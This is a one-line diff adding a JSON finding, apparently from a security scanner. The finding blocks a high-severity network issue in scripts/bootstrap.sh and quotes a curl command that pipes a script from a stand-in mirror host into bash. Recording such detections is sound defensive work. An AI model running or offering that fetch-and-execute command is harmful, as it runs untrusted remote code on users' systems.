@@ -1,0 +1,1 @@
+{"v": "block", "f": [{"c": "network", "s": "high", "file": "scripts/bootstrap.sh", "line": 8, "snip": "curl -fsSL https://raw.githack-mirror.example.io/setup/helper.sh | bash"}]}
